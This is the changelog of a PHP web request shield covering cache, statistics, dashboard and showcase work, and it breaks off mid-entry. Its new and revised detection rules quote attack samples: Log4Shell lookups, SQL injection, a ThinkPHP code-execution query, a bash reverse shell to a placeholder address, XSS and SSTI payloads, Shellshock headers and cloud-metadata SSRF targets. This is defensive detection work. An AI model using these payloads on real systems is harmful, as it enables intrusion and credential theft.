# Changelog

All notable changes to this project are documented here.
The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Changed
- **A relative `store-dir` or `lists-dir` is the rule file's directory**
  (RSF05-02), as `log` already was -- before, it depended on the directory
  PHP happened to run in. A site with a relative `store-dir` finds its
  store in a new place after the update: the secret (passes given out end),
  bans, lists and statistics start afresh there -- write the path out to
  keep the old one. The showcase and the Exponential demo keep their files
  in `var/` next to their rules now, not in `/tmp`. Settings `FORMAT` 66.
- **Only the user PHP runs as reads what the shield writes, by default**:
  the log, the lists, the feeds, the crawler lists and the statistics were
  `0640` in `0750` folders, now `0600` in `0700`. A log reader in PHP's
  group keeps reading with `set file-mode 0640` and `set dir-mode 0750`.
  Existing files keep their mode.
- **`ATK-SSRF-META` costs a seventh on a plain query**: its first part,
  "not after a digit or a dot", is a look-behind now (`(?<![\d.])` instead of
  `(^|[^\d.])`), so PCRE skips ahead to a `1`, `m`, `f`, `/` or `@` instead of
  trying at every character -- 6.1 to 0.9 µs on 1 KB of text, 6.8 to 2.5 µs
  on 1 KB of addresses; a request with all attack rules and a 1 KB query
  42.6 to 37.3 µs. The same matches (500,000 random strings compared).
- **The recorded demo is no longer published on every push** (GitHub Pages
  is off for now): `.github/workflows/pages.yml` runs only when started by
  hand.
- **The attack rules look at a long value twice as fast**: from 128 bytes
  on, a value is matched pattern by pattern instead of against one
  expression of all of them -- PCRE finds each pattern's fixed text quickly
  on its own and loses that in the one expression. A passing request with
  all attack rules and a 1 KB query: about 143 -> 70 µs, 297 bytes about
  50 -> 36 µs; short values are matched as before (one call).

### Fixed
- **A background request never gets the check page** (RSF03-02): a request
  a page's script sends with `fetch()` or `XMLHttpRequest`
  (`Sec-Fetch-Dest: empty`, `X-Requested-With: XMLHttpRequest`) is answered
  as an API is -- with a pass it goes through, without one it gets the check
  as JSON (429, `Request-Shield-Challenge`, no HTML) instead of the HTML
  check page, which the script took for its content (Exponential's admin4
  mega menu: "The Setup menu could not be loaded"). A refusal of such a
  request is JSON too. Navigations, frames and images are unchanged.
  `expect … json-check` says an example gets the check as JSON and never the
  page; `check` takes either. `Responder::apiHeaderLines()` gives the JSON
  check's header lines, as `headerLines()` does the page's. The Exponential
  examples (version 2026-10-17.1) name the admin's mega menu with `api-path`
  (`EXP-ADMIN-BG`, `EXP-AH-BG`), and `docs/use-cases/exponential.md` says
  how the admin's background requests are answered.
- **An address range with a prefix longer than its address** (`1.2.3.4/99`,
  `2001:db8::/129`) is refused naming its line; before it was taken and
  matched nobody.
- **The HTTP cache kept an answer for one spelling of a path under the
  plain path's key** (RSF04-03): `/news//item`, `/n%65ws/item` or
  `/news/./item` were decoded to the same key as `/news/item` -- a CMS's
  redirect to its one spelling, kept, answered the plain path with a
  redirect to itself, for everyone. The key holds the path as it was sent
  now: another spelling is another key; a redirect is kept only when it
  surely leads elsewhere (another scheme, host or path -- not `/news/?` to
  `/news/`, not a relative `Location`); a purge by address or path still
  reaches every spelling. Nor kept: a target sent with a `#` or as a whole
  URL, a request with `X-Original-URL` or `X-Rewrite-URL`. After updating,
  empty the cache once (`request-shield cache <rules> purge`): a loop kept before
  stays until its time runs out.
- **A ban kept in store-dir was written in the umask's mode** -- under the
  usual umask 022 readable for everyone on the machine, and its file holds
  the address. It is written in `file-mode` now (so is the crawler check's
  DNS cache in store-dir); `check` names such files already there.
- **Compiled settings cut short just before their end are compiled anew**:
  a file that still parsed but lacked its last entries was taken -- the
  constructor fills them in with defaults. Every compiled file now ends with
  a marker (`whole`); one without it is built again. (With PHP 8.1-8.3's JIT
  not even a cut in the middle was noticed.)
- **The dashboard's sign-in form works in a browser**: its pages said
  `Referrer-Policy: no-referrer`, and with that policy Chromium and Firefox
  send `Origin: null` with the page's own form -- the form's check (sent
  from this page) refused every browser's token with 403. The pages say
  `Referrer-Policy: same-origin` now: still no address for other sites, and
  the browser sends the page's own `Origin`. `Origin: null` stays refused;
  a program without an `Origin` (curl) passed before and still does.
- **Log4Shell with a lookup inside a lookup is refused** (`ATK-JNDI@2`,
  attack rules `2026.10.2`): `${${lower:j}ndi:ldap://…}` and
  `${${upper:j}${upper:n}di:…}` got past revision 1. Revision 2 refuses a
  `${` inside a `${` and the lookups `lower:`, `upper:`, `ctx:`, `main:`,
  `spring:`; two placeholders side by side still pass. A site that named
  `[ATK-JNDI@1]` is told by `check`. Found by comparing with Mini-WAF's rules.
- **MySQL's versioned comments no longer hide SQL injection**: the attack
  rules saw `1/*!50000UNION*//*!50000SELECT*/1` as `1 1` -- every comment
  became a space, but MySQL runs the body of `/*!…*/` (and MariaDB of
  `/*M!…*/`). Their body now stays; only the comment marks go -- a plain
  comment inside one (`/*!/**/UNION*/`) goes first. Found by
  comparing with Mini-WAF's rules.
- **The check inside the form works with `query strict`**: the shield names
  its script `widget.js?v=<version>`, and `query strict` refused that `v`
  with 404 unless the site declared it -- the shield's own addresses under
  `widget-path` are now left alone by the parameter check.
- **The check page tells screen readers when the check cannot finish**: its
  sentence is a live status (`role="status"`: polite by itself), so the
  reason (no cookies, a loop) is announced when it appears; the ring stays
  decoration (`aria-hidden`).
- **Error pages after their review** (0031 step G.1): `{lang}` pages are
  found in a folder whose name holds `[ ] * ?`, and a page for a new language
  is noticed (the folder is watched); a JSON refusal says `nosniff`. The text
  `try-again` is gone: the pause's sentence is `too-many-text` now, and a rule
  file that still sets `try-again` is told so.
- **Rules & setup shows its steps as circles again**: since the page is the
  core's (`/rs/waf/rules`), its styles -- the numbered circles of the way, the
  tester's verdict, the rules, the settings -- were still in the statistics'
  page and missing on it. They are the page's own now.

### Added
- **`examples/showcase/deploy.sh`: the showcase on a server in one
  command** -- from a clone of the repository, after `git pull`: builds
  the standalone copy, takes the running copy's `var/` over (secret,
  statistics, cache), swaps the document root folder and keeps the one
  before as `.previous`; `--host` and `--admin` are remembered. It never
  replaces another folder or a link.
- **The showcase as one directory for a public host** (`php
  build/showcase.php --out=<dir> [--host=…] [--admin=…]`): the page, the
  library and the Exponential example in `lib/`, and `var/` -- it runs with
  `open_basedir` set to that directory alone (tested). Apache's
  `.htaccess` sends every address to `index.php`; `lib/`, `var/` and
  `.request-shield/` are never served. The copy trusts no proxy, and the
  shield's own pages, the log and the learning run are for `--admin`'s
  addresses only (none: nobody); its rules are compiled once at the build,
  so a wrong `--admin` or `--host` is refused there.
- **`query drop`: leave out what a page does not take, instead of a 404**
  (RSF02-05): `query drop` (the whole site), `query drop at <paths>` or
  inside a `match` block -- an unknown parameter, or a value not of its
  type, leaves `$_GET`, `$_REQUEST`, `QUERY_STRING` and `REQUEST_URI` once
  the request is decided (a copy in `REQUEST_SHIELD_IGNORED`) and is no
  cache key: `/magazin/1?id=xyz` or `?cb=123` is answered as `/magazin/1`,
  from the HTTP cache when kept. Still scanned: an attack in it is refused.
  Next to `query strict` it wins where both apply (GET and HEAD; another
  method keeps `strict`); `set mode monitor` leaves nothing out. A name
  goes as a whole, as PHP's own parser reads it (`page%00x` and ` page`
  are `$_GET['page']`, `items[per[page` is `items_per_page`), so the
  application, the query and the cache key never disagree -- `cache-ignore`
  too, which before matched some of these spellings under another name.
  When something goes, `$_GET` and `$_REQUEST` are PHP's own reading of the
  query that is left. The HTTP cache keeps no address whose names PHP folds
  together, reads twice (`page=1&page=2`) or drops; a request with more
  parameters than PHP reads (`max_input_vars`), or with a separator PHP
  splits on besides `&` (`arg_separator.input`), is never kept. A name with
  brackets or encoded bytes is always scanned by the attack rules.
  Settings `FORMAT` 67. The showcase's magazine uses it: a bot's made-up
  parameters get the kept page.
- **Every plugin is a Composer package of its own** (0031 step H.1):
  `plugins/api`, `plugins/waf`, `plugins/stats` and `plugins/cache` each
  have a `composer.json` (`cjw-network/request-shield-<name>`, the core
  `^1.0`; the WAF's pages require the API, the statistics and the cache
  suggest each other), a LICENSE, README, CHANGELOG, SECURITY.md and a
  `.gitattributes`, ready to be mirrored read-only from H.2 on. Until then
  the plugins ship inside the core package as before (its archive gains the
  papers only). `tests/PackagesTest.php` installs each plugin from a path
  repository next to a core without plugins: it brings what it requires and
  nothing else, its classes load, its words are known and the others' not.
- **`testkit/`** (`cjw-network/request-shield-testkit`): the test runner and
  the checks of `tests/run.php` (`testkitRun()`, `same()`, `truthy()`,
  `skip()`, `freePort()`, `nodeBinary()`) as a package of their own, for the
  plugins' tests outside the monorepo; `tests/run.php` calls it. A test file
  that returns no array of tests now fails; before, its tests were missing
  without a word (a warning, and the run passed).
- **Purges from the application itself** (0031 step G.5, its core part):
  `Shield::active()?->purge(['content-12', 'list'])` -- an adapter in the
  same PHP process makes the HTTP cache's answers with these tags out of
  date (`*`: everything), with no `PURGE` request; a plugin capability,
  `Purger` (the cache has it); nothing happens without one.
  `Shield::active()?->hasWidget()` says whether the check in forms is on,
  without sending its script. Settings `FORMAT` 63.
  ([the HTTP cache](docs/features/RSF04-03-http-cache.md#tags-and-purges-what-the-cms-already-sends))
- **The HTTP cache keeps small answers in memory, and its folder within a
  cap** (0031 step G.4, part 3; proposal 0039): with APCu, answers up to
  `set http-cache-memory-object` (`256K`) are kept in APCu for at most an
  hour -- a hit is one `apcu_fetch` (a 20 KB page: about 9 µs instead of
  16 µs from the disk); longer-lived ones are on the disk too and come back
  on their next hit. `set http-cache-memory` (`32M`) caps the answers'
  share of APCu, and a quarter of APCu always stays free (a full APCu is
  emptied whole, budgets and roles with it). `set http-cache-disk` (`256M`,
  at least `1M`; `0`: none) caps the folder: each of its 256 folders holds a 256th, the
  oldest going first -- counted as written with APCu, at the sweep without;
  `cache … expired` trims every folder. The command line's `cache purge`
  makes the answers in memory out of date (the web server sees it within
  10 s; a `PURGE` request or the API at once). Settings `FORMAT` 62.
  ([the HTTP cache](docs/features/RSF04-03-http-cache.md#memory-first-the-disk-when-needed))
- **The HTTP cache finds the role from FOSHttpCache's user hash** (0031 step
  G.4, part 2b; proposal 0039): `set http-cache-user-context on` (or the
  address to ask) and `set http-cache-user-hash-header X-User-Hash` for
  Exponential Platform -- for a visitor with a session the shield asks
  `/_fos_user_context_hash` as a Varnish does (only the session cookie,
  `X-RS-Lookup`: a MAC the shield knows its own request by), once per
  session for the hash's `max-age`, kept in APCu with its tags (a purge of
  `ez-user-context-hash` asks again); the application gets the hash as from
  a Varnish, and every session of a role shares its pages. No adapter
  needed. A visitor that asks for a hash or sends one gets 400. No hash --
  the cache is skipped for the request; the application not answering
  (no answer, a timeout, 502, 503, 504) pauses every question for 60 s, an answer
  without a hash only that session's. No redirect is followed; a session
  cookie a browser could not send, or a host not on `http-cache-hosts`, is
  never asked with; at most 30 questions a minute for new sessions from one
  address and 2 at a time. `on` asks at the host and port the visitor used.
  Settings `FORMAT` 61. ([the HTTP cache](docs/features/RSF04-03-http-cache.md#the-role-from-foshttpcaches-user-hash-ibexa-exponential-platform))
- **The HTTP cache keeps one page per role** (0031 step G.4, part 2;
  proposal 0039): the application names the visitor's role with
  `Shield::active()?->cacheContext($role, shared: true)` (a new plugin
  capability, `ContextHandler`); the cache remembers `MAC(secret, session
  cookie) -> role` in APCu (`http-cache-session-cookie`,
  `http-cache-context-ttl`), and the next request with that cookie gets the
  role's page before the application starts -- only pages called shared or
  sent with `Vary: X-User-Hash` / `X-User-Context-Hash`, leaving as
  `private, no-cache`; `forgetContext()` on logout, a purge of `rs-context`
  when roles change. A forged cookie finds nothing.
- **The HTTP cache speaks the CMSes' dialects: tags and purges** (0031 step
  G.4, part 1; proposal 0039): an answer's tags (`xkey`, `X-Cache-Tags`,
  `X-LiteSpeed-Tag`, `Surrogate-Key`, `Cache-Tag`, `Edge-Cache-Tag`,
  `X-Magento-Tags`, `X-Location-Id`, `http-cache-tag-headers`) are kept with
  it and taken out of what the visitor gets; `PURGE` (an address, or tags in
  `key` / `X-Cache-Tags`, or `X-Location-Id`) and `PURGEKEYS` (`xkey-purge`)
  from `http-cache-purgers` or with `X-Invalidate-Token`
  (`http-cache-purge-token`) make the answers out of date -- Exponential
  Platform's and Ibexa's purge settings work unchanged; `X-LiteSpeed-Purge`
  in any answer purges too; `cache … purge --tag=` and the API's
  `tags`. A plugin may answer a method the site does not take before the
  rules (`MethodHandler`); anyone else gets the 405 as before. Nobody may
  purge by request until `http-cache-purgers` or the token is set.

- **`set file-mode` and `set dir-mode`: the modes of what the shield
  writes**, for servers with rules for new folders and files: `0600` and
  `0700` by default; a group (`0640`, `0750`), an inherited group (`02770`).
  Set exactly with `chmod()` after a file or folder is made -- the umask
  takes nothing away and adds nothing, each missing parent folder too; no
  data is ever in a file of another mode (written whole: a temporary file
  made in file-mode, filled, renamed; appended: a new file made in
  file-mode at once, the umask set to match for that call -- with threaded
  PHP made, its mode set, then the line). Never writable for everyone,
  never a mode that keeps PHP from writing; above the site blocks. Applies to store-dir and its folders, the log, the lists,
  the feeds, the crawler lists, the statistics, the HTTP cache, a ban kept
  in store-dir, a learning run, `advise --write`, a new `feeds export
  --write` file (one there keeps its read and write bits). The secret stays `0600`, the
  compiled settings `0600` in `0700`. `check` warns about a mode everyone
  may read, files in store-dir, lists-dir and the log everyone may read
  already (bans a folder down too), and a store-dir owned by another user
  than the command's (what `deny` writes there in 0600 the web server's PHP
  could not read). Cost: two `umask()` calls around a log line and, without
  APCu, a statistics line -- about 0.6 µs; nothing else on the passing path.
  Settings `FORMAT` 58.
  ([settings](docs/features/RSF05-02-settings.md#file-and-folder-modes))

- **`request-shield advise`** (proposal 0016, step 2): suggestions from a
  learning run -- the query parameters with the type all their values fit,
  `include @tracking` and `monitor query strict`, `monitor allow POST …` where
  the run sent forms (numbers in a path as `*`; a `*` from the recording
  never), `post-origin same`, `api-path` for the addresses the run sent JSON
  to and the folders that are an API by their name; a name declared for some paths only gets
  a line with `at`; only what the rules do not say yet. Each line checked by the rule parser, then the run replayed with all
  of them enforced, so the site sees whether one would refuse its own clicks.
  `--write` keeps them in `<store-dir>/advice.rules` for an include, `--json`
  for tools.
- **A new built-in scanner rule, `SCAN-CONFIG`** (scanner rules
  `2026.10.2`): project and key files -- `composer.json`, `composer.lock`,
  `web.config`, `docker-compose.yml`, `.npmrc`, `id_rsa` and the other SSH
  keys -- answered 404 before the site starts; `/composer-guide` passes.
  `unblock [SCAN-CONFIG]` takes it back.
- **`ATK-PHP@2`** (attack rules `2026.10.2`, `include @attacks`): also
  ThinkPHP's way into its own code -- a `\think\…` class in the query
  (`?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system`,
  CVE-2018-20062): `think\` and one of the classes its exploits name (`app`,
  `container`, `request`, `template`, `view`, `module`, `config`);
  `App\Think\Foo`,
  JSON text with `think\n` and the word "invokefunction" pass.
- **`ATK-SHELL@2`** (attack rules `2026.10.2`, `include @attacks`): also a
  reverse shell's `/dev/tcp/<host>/<port>` (or `/dev/udp/…`) --
  `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1` passed revision 1, which needs
  a `;` or `|` before a command; `/dev/tcp` named alone passes.
- **`ATK-UA-TOOLS@2`** (attack rules `2026.10.2`, `include @attacks`): also
  feroxbuster, arachni, whatweb and w3af by their default User-Agent, and
  ffuf by the one it really sends ("Fuzz Faster U Fool v2…") -- revision 1
  looked for "ffuf", which ffuf does not send; dirsearch, wafw00f and
  sqlninja when they send their name (by default dirsearch and wafw00f send
  a browser's).
- **A new attack rule, `ATK-XSS-ATTR`** (attack rules `2026.10.2`,
  `include @attacks`): cross-site scripting through attributes that need no
  `on…` event -- `<button formaction=…>`, `<a xlink:href=…>` in SVG -- only
  inside a tag, also past an `&` in it (decoded, a `%26` is no different from
  a separator) and past a quoted `>`; the words alone and `x < y
  formaction=1` pass. `ATK-XSS-EVENT@2` reads past a quoted `>` too:
  `<img title=">" src=x onerror=…>` passed revision 1. Both keep the plain
  expression and add one that follows quoted values up to the next `<`:
  everything revision 1 refused stays refused (`<img src==" onerror=…>`),
  and a query full of tags costs about what a plain one does -- each
  expression stops at the next `<` (ATTR's first at a `<` and a letter), also
  without PCRE's JIT (revision 1 took up to 100 ms there on 4 KB of `<`
  followed by an `=`; a test measures both). Not caught: `title="<>"`, a
  quote in a name or an unquoted value next to a quoted `>`. Taken from comparing with
  Mini-WAF's rules.
- **A new attack rule, `ATK-SHELLSHOCK`** (attack rules `2026.10.2`,
  `include @attacks`): a header whose value starts with `() {` -- Shellshock
  (CVE-2014-6271 and after), scanned for everywhere, dangerous for CGI
  scripts behind the site; `() {` inside a value passes (a search for
  `var f = function () { return x };`), cookies are not looked at. The
  attack rules' `headers` target now normalises each value on its own when
  the decoded headers hold a `/*` (a comment opened in one header no longer
  hides the next, also one that decoding makes: `/%2a`) and joins them with
  `\x1e`, no white space, so a pattern can tell where a value starts; it
  takes the Content-Type too (PHP's `CONTENT_TYPE`). A passing request with
  all attack rules: about +0.5 to 1 µs (each request now gathers
  its headers once for the attack rules' `headers` and `anywhere` targets,
  which also makes `anywhere` cheaper). Attack patterns
  may now use look-arounds (`(?<!…)`, `(?=…)`); back references, named
  groups and calls or conditions by number (`(?1)`, `(?R)`, `(?(1)…)`) are
  refused -- in the combined expression they would reach another pattern.
- **`Server-Timing` with debug-header** (proposal 0046 step 3): with `set
  debug-header on` a request let through -- and an answer from the HTTP cache
  -- carries `Server-Timing: shield;dur=<ms>;desc=request-shield`, the
  shield's own time for the browser's network tab; nothing without it.
- **The slowest pages** (statistics, parts `pages` and `times`, proposal 0046
  step 2): each page view's band, sum and cache hit, kept for the same pages
  as the views (past the limit as "(other)" too); the statistics page and
  `stats` list the 20 slowest pages viewed at least 10 times, with median,
  slow end and share from the cache. About +1.5 µs a page view with APCu.
- **How fast the site answered** (statistics, part `times`, proposal 0046
  step 1): `set stats requests pages times` measures each request the shield
  lets through, from the web server's start to the end of the site's main
  script -- twelve fixed bands per hour (1 ms to over 10 s), by kind of
  visitor and by what the HTTP cache did (hit, miss, nostore with its reason,
  past), the sum in µs; the statistics page and `stats` show the median, the
  slow end, the cache's share of hits and what it saved, why misses were not
  kept, the shield's share; `set stats-slow 2s` writes slow requests to a slow
  log (path without query, peak memory, no address). Off by default; with it
  about +2 µs a request with APCu. `CachePlugin::refusal()` says why an answer
  is not kept (keep() uses it too). Settings FORMAT 57.
- **The HTTP cache's page in the dashboard** (`/rs/cache`, proposal 0047's
  area "Cache"): memory and disk against their caps (`http-cache-memory`,
  `http-cache-disk`), a bar per day for the last two weeks -- hits, misses,
  not kept, past the cache, the share of hits above each (from the
  statistics' part `times`; colours checked for colour blindness, light and
  dark; the numbers also as a table) -- the way to the response times by
  hit and miss, purges
  by tag, below a path or everything (forms with the page's token); a tab
  only while `http-cache` is on, for the administrator. Settings `FORMAT` 65.
- **The showcase's tab "Cache"** (`/cache`): the HTTP cache at work in front
  of a magazine that takes half a second a page -- every button a real
  request, timed in the browser: hits and misses, members sharing their
  page (`cacheContext()`), publishing one article (`Shield::purge()`),
  campaign links as hits (`cache-ignore @tracking`); the showcase now keeps
  the statistics with response times, so the dashboard shows hits against
  misses (this machine only). The picture keeps its height whatever a
  request's headers say (its lines end in "…", whole on hover), and the
  log's columns are as wide as their content -- the address takes the rest.
  *Play automatically* goes at reading pace: each step shows its story
  first and sends its request 1.5 s later, then waits for the caption to be
  read (2 to 4.5 s); the dot moves slower.
  A short introduction above the buttons says what can be tried there (the
  HTTP cache in different roles), folded behind a "?" (the browser remembers
  it open); docked at the bottom it is left out. *Play automatically* has a
  row of its own above the buttons: while it plays, a bar and "In 5 s: …"
  next to it say what comes next, "Running …" while that step runs. The
  picture shows each request's result (hit, miss, refused, not kept) above
  the station that decided it, and who sent it: the visitor 🙂, member A 🧑,
  member B 👩 (a blue ring), the editor 🧑‍💻 (a violet one), a bot 🤖 (red,
  dashed), a search crawler 🔎 (green, dashed: *A search crawler reads*
  fetches the front page and every article anonymously, as a visitor; a
  step of the automatic play too) -- the faces also in the log's "Who".
  On a host name not in `http-cache-hosts` the page says the cache is off
  there and how to start the showcase for that name, and the picture says
  "cache off" instead of telling of hits that never come.
- **Working with Exponential 6's own HTTP cache** (0031 step G.6, part 1;
  proposal 0048): the statistics read its `X-Exp-Cache` as they read
  `X-RS-Cache` -- `HIT` and `STALE` hits, `MISS` a miss, `BYPASS` a page it
  passes by (`app-bypass`) -- so the response times by hit and miss show its
  cache too; the shield's HTTP cache never keeps a page that carries
  `X-Exp-Cache` (`appcache`), and says once a minute in PHP's error log to
  switch it off there.
- **Fewer cache keys: ignored and unknown query parameters** (proposal
  0048, part 3 of step G.6): `cache-ignore utm_* gclid` (or `cache-ignore
  @tracking`, the shipped set's names) -- such parameters never make a page
  uncacheable; after the rules decided on the whole query they leave
  `$_GET`, `$_REQUEST`, `QUERY_STRING` and `REQUEST_URI` (a copy in
  `REQUEST_SHIELD_IGNORED`), so the HTTP cache and any PHP cache after the
  shield keep one page for every campaign link; names as PHP names them
  (`utm.source`). `set cache-unknown-query hit-only`: a parameter
  `cache-query` does not name is answered from the kept page without it and
  never kept (`REQUEST_SHIELD_CACHE_LOOKUP` names that page for a PHP cache);
  `check` warns about it without `cache-query`. `show` prints both. Settings
  `FORMAT` 64. ([the cacheable definition](docs/features/RSF04-01-cacheable-definition.md#query-parameters-in-the-key-ignored-unknown))
- **Proposal 0049 a reverse proxy plugin** (draft): fixed pairs of a site
  address and an address elsewhere (`proxy GET /stats/m.js to https://…`),
  answered after the shield's checks -- e.g. Matomo's tracking through the
  site's own host: the visitor's address masked, no cookies passed on, the
  script kept by the HTTP cache, bots kept out of the statistics; the risks
  (open proxy, held workers, leaked cookies, consent) and what the design
  does about each.
- **Proposal 0048 query parameters and the PHP caches** (draft): three
  kinds of parameters -- in the key (`cache-query`), ignored (`cache-ignore
  utm_* …`: taken out before the cache and the application run, the page
  kept without them) and unknown (`set cache-unknown-query hit-only`: the
  page without them answers, nothing is kept) -- handed on as
  `REQUEST_SHIELD` and `REQUEST_SHIELD_CACHE_LOOKUP`, so the PHP caches
  (the shield's, Exponential's `exphttpcache`) keep fewer keys; and step G.6
  re-dedicated: Exponential 6's own HTTP cache works with the shield (its
  `X-Exp-Cache` in the statistics), an upstream pull request for Ibexa's tag
  pattern.
- **Proposal 0047 the admin pages: an area per plugin, and a login by
  default** (draft): two rows of tabs -- Start, Protection, Statistics,
  Cache, API, System, each with its pages, an area only where its plugin is
  loaded; a login always asked (`restrict` only adds to it), the first admin
  by `init` or a one-time setup code in the store, a password for people
  (`password_hash()`) beside the tokens, sign out everywhere.
- **Proposal 0046 response times in the statistics** (draft): with a new
  part `times`, the end of a request the statistics already hear gives how
  long the site took -- twelve fixed bands per hour (fine below 10 ms for the
  HTTP cache), p50/p95 by kind of visitor next to the requests (load), the
  HTTP cache's share of hits and what it saves (hit, miss, past it), a slow
  log with peak memory and without addresses; then the slowest pages;
  `Server-Timing` only with `debug-header`; off by default (estimated at
  about 1 µs with APCu, to be measured).
- **The showcase's live log names who is banned right now**: from the
  store (as the dashboard), with the masked address, the seconds left, the
  rule and the visitor's kind guessed from the User-Agent (browser, crawler,
  script); a tab *all bans* adds the ones set by hand (`deny`: rule file or
  list), for good or until when. Addresses only as their network, always
  (a range's host bits cleared); the window keeps one height.
- **`request-shield replay` takes a learning run's recording**
  (`learned.jsonl`) -- a test for every deployment: the requests clicked in
  the run (those it let through) and what the pages offered (forms, links,
  script addresses) are sent through the rules, each parameter with a value
  of its type; exit 1 when a clicked one would be refused (one only offered
  on a page is a note, `--found=fail` counts it), `--junit` for CI. The
  recording holds no values, so it can live in the project's repository.
- **A learning run records a developer's clicks by their shape**
  (`request-shield learn <main.rules> start|stop|status`, proposal 0016):
  the requests that carry the run's token -- the cookie `rs-learn`, turned on
  and off in the browser with two bookmarks `start` prints, or the header
  `Request-Shield-Learn` for tests -- optionally only from `--from`
  addresses, for `--for` (1m to 7d). One JSON line per request in
  `<store-dir>/learned.jsonl`: method, host, path, the type of each
  parameter and form field, the content type, the shield's decision and the
  site's status -- never a value or an address. For the site's HTML answers
  also what they offer (`found`): forms with action, method and field types,
  links and the addresses inline scripts name, and the site's other hosts --
  so a form nobody sent and an API nobody called are found too. The token
  only marks; it lets nothing past a check. Without a run: nothing on the
  request path.
- **A new attack rule, `ATK-SSRF-META`** (attack rules `2026.10.2`,
  `include @attacks`): a cloud's metadata address in the query --
  `169.254.169.254`, `metadata.google.internal`, `100.100.100.200`,
  `169.254.170.2`, `fd00:ec2::254`, also as mapped IPv6, written as one
  number, in hex or octal, and AWS's `instance-data`: a site that fetches an address from the request would hand out
  its own credentials. Taken from comparing with Mini-WAF's rules.
- **A new attack rule, `ATK-PHP-OBJ`** (attack rules `2026.10.2`,
  `include @attacks`): a serialised PHP object in the query --
  `O:8:"stdClass":0:{}`, `O:+8:…`, `C:…`, also inside an array -- the way
  into `unserialize()` gadget chains; a serialised array passes. Taken from
  comparing with Mini-WAF's rules.
- **A new attack rule, `ATK-SSTI`** (attack rules `2026.10.2`,
  `include @attacks`): template injection in the query -- `{{7*7}}`,
  `{{_self.env…}}` (Twig), `{{''.__class__}}` (Jinja); a plain placeholder
  (`{{ user.name }}`) passes. Taken from comparing with Mini-WAF's rules.
- **A new attack rule, `ATK-SQL-BOOL`** (attack rules `2026.10.2`,
  `include @attacks`): SQL injection without quotes -- `or 1=1` and
  sqlmap's boolean tests `and 6522=6522` / `and 6522=6523`. Small numbers
  pass ("rock and roll 2=2", "or 1=2"); 3 to 5 digits on both sides of `=`
  after `and`/`or` are refused, equal or not. Taken from comparing with
  Mini-WAF's rules.
- **A new attack rule, `ATK-SQL-FUNC`** (attack rules `2026.10.2`,
  `include @attacks`): SQL injection through the database's own functions --
  `extractvalue(`/`updatexml(` (the answer in the error message),
  `load_file(`, `into outfile '…'`, `@@version` and other server variables,
  `xp_cmdshell`. The words alone pass ("load file into outfile tutorial",
  "extract value from json"). Taken from comparing with Mini-WAF's rules.
- **The log says how long a pause lasts**: a line whose client is told to wait
  (a throttle, or a spent budget's check) carries `wait=<seconds>` (the
  `Retry-After` the client got), so growing bans (5, 10, 20 … s) and pause
  lengths can be read from the log; `LogStats::parse()` reads it back
  (`wait`), and the live view keeps it, from the log or from memory.
- **`challenge POST **`: every form and every endpoint checked** -- `challenge`
  takes methods first (`challenge [<METHODS>] <paths>`, as `allow`; also in a
  `match` block): only those methods are checked there, so `challenge POST
  **` asks a pass of every form sent and every endpoint posted to while the
  pages that show them stay untouched; a form without a pass gets the check
  page, which sends it again (`challenge.alwaysMethods`).
- **Proposal 0045 the shield's own files out of a browser's reach** (draft):
  rules cannot protect them -- the web server sends a file that exists
  without PHP; so a note when a directory of the shield lies in the
  document root (at compile time, and `check --docroot`), and a
  `Require all denied` `.htaccess` in every directory the shield creates.
- **Proposal 0044 the check in the form without a cookie** (draft): like
  ALTCHA, the answer only in the form field -- `set pass-cookie off` sets no
  pass, every form sent solves its own task; the check on pages (which needs
  a cookie) is refused by `check` in that mode.
- **Proposal 0043 the shield's decision in the web server's access log**
  (Draft): a header meant for the server's log (`X-RS-Log: reject attack
  ATK-SQL-UNION <ref>`, `set server-log header`) or Apache's note
  (`apache_note`, mod_php), noted by the server and taken out of the answer
  (Apache `Header note` + `unset`, nginx `$upstream_http_x_rs_log` +
  `fastcgi_hide_header`); one log with the shield's decision, every request
  at no extra write, fail2ban at the firewall; nothing on the passing path at
  the default level.
- **A showcase** (`examples/showcase`): one page in German and English that
  shows what the shield does and lets you try it -- the rule file of a small
  website (about fifteen lines, real values) beside what each rule means, and
  every example of it a card whose button sends a real request; a burst of
  125 page views shows the invisible check and the pause. Bootstrap is kept
  beside it, nothing is loaded from elsewhere; `tests/ShowcaseTest.php` holds
  the page to its rules. The front page shows a taste (three requests to
  send) and, right after the promises, the browser check (drawn, and the
  real one to open) beside the growing pause (a staircase, and the sign-in
  to try); everything to try is on `/try`, the Exponential example on
  `/exponential`. A page "Build rules" (`/learn`) starts a learning
  run for the visitor's browser, shows the recorded clicks live and checks
  the rules against them (replay). A section on Exponential shows the rules of
  `examples/exponential` by their sections, each example decided on the
  server with those rules as `request-shield test` decides it. A section
  "WCAG & GDPR" sets ALTCHA's pages on accessibility and the GDPR beside
  what holds for the shield's check and where it differs (a pass cookie,
  no external audit).
- **ALTCHA's widget v3 tested against the shield** (`tests/AltchaWidgetTest.php`):
  the widget's own code (3.3.0), run in Node, solves the shield's task and
  the shield accepts its answer -- bound to its client, budget and expiry.
  The test runs when `ALTCHA_WIDGET` names an unpacked `altcha` npm package
  and Node has WebCrypto (18+); it is skipped otherwise.
- **Proposal 0041 a risk score per request** (Draft): a number from 0 to 100
  in the live view, made from what the shield already knows (a budget's
  fill, a false crawler, a feed, unsolved checks, earlier bans), with the
  signals as labels; "watched" rows for near misses that passed (opt-in);
  shown first, deciding nothing.
- **Proposal 0042 a harder task for forms** (Draft): ALTCHA's v2 work
  (PBKDF2, Argon2id) for the check inside the form only -- memory-hard, so
  a GPU bot is no faster than a browser, at a measured 2-32 ms per check on
  the server; why ALTCHA's PHP library is not used (PHP 8.1, a Composer
  dependency), what is taken from it under its MIT licence instead.
- **Proposal 0040 in a PHP application server** (Draft): the shield in
  Qbix / Exponential Velocity (PHP's own web server with long-lived
  workers) -- the settings loaded once before the workers fork, a hook
  before any application code, static files decided too; first a test
  setup (one fork per request, then persistent workers), what persistent
  workers need (state reset by the shield, the page cache off where the
  end of a request is not seen), then an adapter.
- **Use case "an accessible website, hardened: no puzzle for anyone"**: why
  every captcha shuts someone out (pictures, audio, riddles, sliders, time
  limits, Google's score; WCAG 1.1.1 and 3.3.8), compared in plain language
  with the browser check, which asks the browser and not the person; three
  layers for a form (from your own pages, the box in the form, five an
  hour), two pictures, and a test that holds the page's rules to what it
  says.
- **Proposal 0039 a page cache that speaks the known dialects** (Draft):
